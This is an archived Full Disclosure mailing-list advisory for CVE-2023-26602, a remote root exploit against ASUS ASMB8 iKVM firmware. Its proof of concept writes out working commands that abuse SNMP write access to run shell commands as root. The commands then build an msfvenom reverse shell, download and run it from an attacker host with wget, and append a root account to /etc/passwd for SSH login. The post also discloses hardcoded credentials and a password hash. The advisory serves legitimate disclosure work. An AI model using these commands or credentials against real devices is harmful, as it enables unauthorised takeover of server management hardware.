---
title: [NetworkSEC NWSSA] CVE-2023-26602: ASUS ASMB8 iKVM RCE and SSH Root Access
url: https://seclists.org/fulldisclosure/2023/Feb/15
source: Full Disclosure
date: 2023-03-01
fetch_date: 2025-10-04T08:23:23.072224
---

# [NetworkSEC NWSSA] CVE-2023-26602: ASUS ASMB8 iKVM RCE and SSH Root Access

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](14)
[By Date](date.html#15)
[![Next](/images/right-icon-16x16.png)](16)

[![Previous](/images/left-icon-16x16.png)](14)
[By Thread](index.html#15)
[![Next](/images/right-icon-16x16.png)](16)

![](/shared/images/nst-icons.svg#search)

# [NetworkSEC NWSSA] CVE-2023-26602: ASUS ASMB8 iKVM RCE and SSH Root Access

---

*From*: Peter Ohm <info () nwsec de>
*Date*: Mon, 27 Feb 2023 16:50:02 +0100

---

```
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
# Exploit Title:        ASUS ASMB8 iKVM RCE and SSH Root Access
# Date:                 2023-02-16
# Exploit Author:       d1g () segfault net for NetworkSEC [NWSSA-002-2023]
# Vendor Homepage:      https://servers.asus.com/search?q=ASMB8
# Version/Model:        ASMB8 iKVM Firmware <= 1.14.51 (probably others)
# Tested on:            Linux AMI2CFDA1C7570E 2.6.28.10-ami armv5tejl
# CVE:                  CVE-2023-26602
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

++++++++++++++++++++
0x00    DESCRIPTION
++++++++++++++++++++

During a recent engagement, a remote server management interface has been
discovered. Furthermore, SNMPv2 was found to be enabled, offering write
access to the private community, subsequently allowing us to introduce
SNMP arbitrary extensions to achieve RCE.

We also found a hardcoded account sysadmin:superuser by cracking the
shadow file (md5crypt) found on the system and identifed an "anonymous"
user w/ the same password, however a lock seems to be in place to prevent
using these credentials via SSH (running defshell as default shell).

+++++++++++++++
0x01    IMPACT
+++++++++++++++

By exploiting SNMP arbitrary extension, we are able to run any command on
the system w/ root privileges, and we are able to introduce our own user
circumventing the defshell restriction for SSH.

+++++++++++++++++++++++++++++++
0x02    PROOF OF CONCEPT (PoC)
+++++++++++++++++++++++++++++++

At first, we have to create required extensions on the system, e.g. via
```

snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c private x.x.x.x
'nsExtendStatus."cmd"' = createAndGo 'nsExtendCommand."cmd"' = /bin/sh
'nsExtendArgs."cmd"' = '-c "[command]"'

```
and if everything is set, we can just run that command by

snmpbulkwalk -c public -v2c x.x.x NET-SNMP-EXTEND-MIB::nsExtendObjects

which will execute our defined command and show us its output.

+++++++++++++++++++++++++++++++
0x03    SSH Remote Root Access
+++++++++++++++++++++++++++++++

The identified RCE can be used to transfer a reverse tcp shell created
by msfvenom for arm little-endian, e.g.
```

msfvenom -p linux/armle/shell\_reverse\_tcp LHOST=x.x.x.x LPORT=4444 -f
elf -o rt.bin

```
We can now transfer the binary, adjust permissions and finally run it:
```

snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c private x.x.x.x
'nsExtendStatus."cmd"' = createAndGo 'nsExtendCommand."cmd"' = /bin/sh
'nsExtendArgs."cmd"' = '-c "wget -O /var/tmp/rt.bin [http://x.x.x.x/rt.bin"'](http://x.x.x.x/rt.bin%22%26apos);
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c private x.x.x.x
'nsExtendStatus."cmd"' = createAndGo 'nsExtendCommand."cmd"' = /bin/sh
'nsExtendArgs."cmd"' = '-c "chmod +x /var/tmp/rt.bin"'
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c private x.x.x.x
'nsExtendStatus."cmd"' = createAndGo 'nsExtendCommand."cmd"' = /bin/sh
'nsExtendArgs."cmd"' = '-c "/var/tmp/rt.bin"'

```
Again, we have to request execution of the lines in the MIB via:

snmpbulkwalk -c public -v2c x.x.x.x NET-SNMP-EXTEND-MIB::nsExtendObjects
```

We get a reverse connection from the host, and can now act on the local
system

```
to easily echo our own line into /etc/passwd:

echo d1g:OmE2EUpLJafIk:0:0:root:/root:/bin/sh >> /etc/passwd

By setting the standard shell to /bin/sh, we are able to get a SSH root
shell into the system, effectively circumventing the defshell restriction.

$ sshpass -p xxxx ssh x.x.x.x -oHostKeyAlgorithms=+ssh-dss -l d1g

BusyBox v1.13.2 (2017-07-11 18:39:07 CST) built-in shell (ash)
Enter 'help' for a list of built-in commands.

# uname -a
```

Linux AMI2CFDA1C7570E 2.6.28.10-ami #1 Tue Jul 11 18:49:20 CST 2017
armv5tejl unknown

```
# uptime
 15:01:45 up 379 days, 23:33, load average: 2.63, 1.57, 1.25
# head -n 1 /etc/shadow
sysadmin:$1$A17c6z5w$5OsdHjBn1pjvN6xXKDckq0:14386:0:99999:7:::

---

#EOF

--

Peter Ohm
Security Research

CEO/CTO NetworkSEC

Tel. +49 6841 1871137 (Voicebox)
Tel. +49 2633 2992440 (TelCo)

https://networksec.de
https://nwsec.de
https://geeksec.de
```

**Attachment:
[OpenPGP\_signature](att-15/OpenPGP_signature.bin)**
*Description:* OpenPGP digital signature

```
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](14)
[By Date](date.html#15)
[![Next](/images/right-icon-16x16.png)](16)

[![Previous](/images/left-icon-16x16.png)](14)
[By Thread](index.html#15)
[![Next](/images/right-icon-16x16.png)](16)

### Current thread:

* **[NetworkSEC NWSSA] CVE-2023-26602: ASUS ASMB8 iKVM RCE and SSH Root Access** *Peter Ohm (Feb 27)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")